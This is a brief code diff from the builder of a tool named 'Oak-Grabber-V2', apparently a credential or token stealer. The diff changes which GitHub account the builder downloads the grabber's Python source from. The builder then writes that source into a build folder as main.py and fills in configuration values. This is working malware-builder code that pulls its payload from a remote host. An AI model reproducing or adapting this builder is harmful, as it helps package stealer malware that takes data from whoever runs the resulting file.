@@ -133,7 +133,7 @@ class WriteConfig:
         """
         Writes the config data to the config file
         """
-        source = requests.get("https://raw.githubusercontent.com/dynastyoak/Oak-Grabber-V2/main/oakv2.py")
+        source = requests.get("https://raw.githubusercontent.com/dreamyoak/Oak-Grabber-V2/main/oakv2.py")
 
         with open(self.build_dir+"\\main.py", "w", encoding="utf-8") as f:
             content = str(source.content.decode('utf-8')).replace(
